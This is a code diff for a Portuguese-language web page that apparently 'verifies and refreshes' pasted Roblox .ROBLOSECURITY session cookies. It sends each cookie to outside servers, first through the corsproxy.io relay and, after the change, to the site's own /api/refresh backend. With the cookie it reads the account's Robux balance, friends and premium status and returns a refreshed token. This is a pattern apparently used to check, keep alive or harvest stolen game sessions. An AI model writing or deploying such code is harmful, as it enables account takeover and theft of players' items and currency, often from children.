@@ -2592,21 +2592,12 @@
     const elCookieOut= document.getElementById('rfrCookieOut');
     const copyBtn    = document.getElementById('rfrCopyBtn');
 
-    const PROXY = 'https://corsproxy.io/?';
-
     function showError(msg){
       errorMsg.textContent = msg;
       errorBox.classList.add('show');
       result.classList.remove('show');
     }
     function hideError(){ errorBox.classList.remove('show'); }
-
-    function parseCookie(raw){
-      const t = raw.trim();
-      // Extrai o token depois da mensagem de aviso
-      const match = t.match(/_\|WARNING[^|]*\|_(.+)/);
-      return match ? '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' + match[1].trim() : t;
-    }
 
     function setBtnLoading(loading){
       btn.disabled = loading;
@@ -2615,94 +2606,77 @@
         : '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 01-15.36 6.36L3 16"/><path d="M3 21v-5h5"/><path d="M3 12a9 9 0 0115.36-6.36L21 8"/><path d="M21 3v5h-5"/></svg> VERIFICAR &amp; ATUALIZAR';
     }
 
-    async function proxyFetch(url, cookie){
-      const res = await fetch(PROXY + encodeURIComponent(url), {
-        headers: {
-          'Cookie': '.ROBLOSECURITY=' + cookie,
-          'x-cors-headers': JSON.stringify({'Cookie': '.ROBLOSECURITY=' + cookie})
-        }
-      });
-      if(!res.ok) throw new Error('HTTP ' + res.status);
-      return res.json();
-    }
-
     async function verify(){
-      const raw = input.value;
-      if(!raw.trim()){ showError('Cole o cookie antes de verificar.'); return; }
-
-      const cookie = parseCookie(raw);
-      if(cookie.length < 50){ showError('Cookie muito curto ou inválido.'); return; }
+      const raw = input.value.trim();
+      if(!raw){ showError('Cole o cookie antes de verificar.'); return; }
+      if(raw.length < 20){ showError('Cookie muito curto ou inválido.'); return; }
 
       hideError();
       setBtnLoading(true);
       result.classList.remove('show');
 
       try {
-        // 1) Authenticated user info
-        const auth = await proxyFetch('https://users.roblox.com/v1/users/authenticated', cookie);
-        const userId = auth.id;
-        const username = auth.name || auth.displayName || 'Desconhecido';
+        const res = await fetch('/api/refresh', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cookie: raw }),
+        });
 
-        // 2) Robux (pode falhar)
-        let robux = '—';
-        try {
-          const econ = await proxyFetch('https://economy.roblox.com/v1/user/currency', cookie);
-          robux = (econ.robux ?? '—').toLocaleString('pt-BR');
-        } catch(_){}
+        const data = await res.json();
 
-        // 3) Public user info
-        let created = '—', isPremium = false, friendCount = '—';
-        try {
-          const userInfo = await proxyFetch(`https://users.roblox.com/v1/users/${userId}`, cookie);
-          if(userInfo.created){
-            const d = new Date(userInfo.created);
-            created = d.toLocaleDateString('pt-BR', {day:'2-digit', month:'short', year:'numeric'});
-          }
-          isPremium = !!userInfo.hasVerifiedBadge || false;
-        } catch(_){}
-
-        // 4) Friends count
-        try {
-          const fr = await proxyFetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, cookie);
-          friendCount = (fr.count ?? '—').toLocaleString('pt-BR');
-        } catch(_){}
-
-        // 5) Avatar headshot (public, no auth needed)
-        try {
-          const av = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
-          const avj = await av.json();
-          const imgUrl = avj?.data?.[0]?.imageUrl;
-          if(imgUrl){
-            elAvatar.src = imgUrl;
-            elAvatar.style.display = 'block';
-            elAvatarPh.style.display = 'none';
-          }
-        } catch(_){}
-
-        // 6) Premium via memberships
-        try {
-          const mem = await proxyFetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, cookie);
-          isPremium = !!mem;
-        } catch(_){}
+        if(!res.ok || !data.ok){
+          showError(data.error || 'Cookie inválido ou expirado.');
+          return;
+        }
 
         // Preenche UI
-        elUsername.textContent = username;
-        elUserId.textContent = 'ID: ' + userId;
-        elRobux.textContent = robux;
-        elStatus.textContent = 'Ativo';
-        elCreated.textContent = created;
-        elFriends.textContent = friendCount;
-        elBadge.style.display = 'block';
-        elPremium.style.display = isPremium ? 'inline-flex' : 'none';
+        elUsername.textContent = data.displayName || data.username || '—';
+        elUserId.textContent   = 'ID: ' + (data.userId || '—');
 
-        // Cookie atualizado (limpo)
-        const cleanCookie = parseCookie(raw);
-        elCookieOut.textContent = cleanCookie;
+        elRobux.textContent = data.robux != null
+          ? Number(data.robux).toLocaleString('pt-BR')
+          : '—';
+
+        elStatus.textContent = 'Ativo ✓';
+
+        if(data.created){
+          const d = new Date(data.created);
+          elCreated.textContent = d.toLocaleDateString('pt-BR', {day:'2-digit', month:'short', year:'numeric'});
+        } else {
+          elCreated.textContent = '—';
+        }
+
+        elFriends.textContent = data.friendCount != null
+          ? Number(data.friendCount).toLocaleString('pt-BR')
+          : '—';
+
+        if(data.avatarUrl){
+          elAvatar.src = data.avatarUrl;
+          elAvatar.style.display = 'block';
+          elAvatarPh.style.display = 'none';
+        } else {
+          elAvatar.style.display = 'none';
+          elAvatarPh.style.display = 'flex';
+        }
+
+        elBadge.style.display  = 'block';
+        elPremium.style.display = data.isPremium ? 'inline-flex' : 'none';
+
+        // Cookie refreshado (novo se Roblox rotacionou, senão o limpo)
+        elCookieOut.textContent = data.refreshedCookie || raw;
+
+        // Badge indicando se foi rotacionado
+        const cookieLabelEl = document.querySelector('.rfr-cookie-label');
+        if(cookieLabelEl){
+          cookieLabelEl.innerHTML = data.wasRefreshed
+            ? '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 01-15.36 6.36L3 16"/><path d="M3 21v-5h5"/><path d="M3 12a9 9 0 0115.36-6.36L21 8"/><path d="M21 3v5h-5"/></svg> Cookie Atualizado <span style="background:rgba(62,207,106,.15);border:1px solid rgba(62,207,106,.4);color:#3ecf6a;font-size:10px;padding:2px 8px;border-radius:999px;margin-left:6px;">NOVO</span>'
+            : '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 01-15.36 6.36L3 16"/><path d="M3 21v-5h5"/><path d="M3 12a9 9 0 0115.36-6.36L21 8"/><path d="M21 3v5h-5"/></svg> Cookie Limpo';
+        }
 
         result.classList.add('show');
 
       } catch(e){
-        showError('Cookie inválido, expirado ou erro de rede. Verifique e tente novamente.');
+        showError('Erro de conexão. Verifique sua internet e tente novamente.');
       } finally {
         setBtnLoading(false);
       }
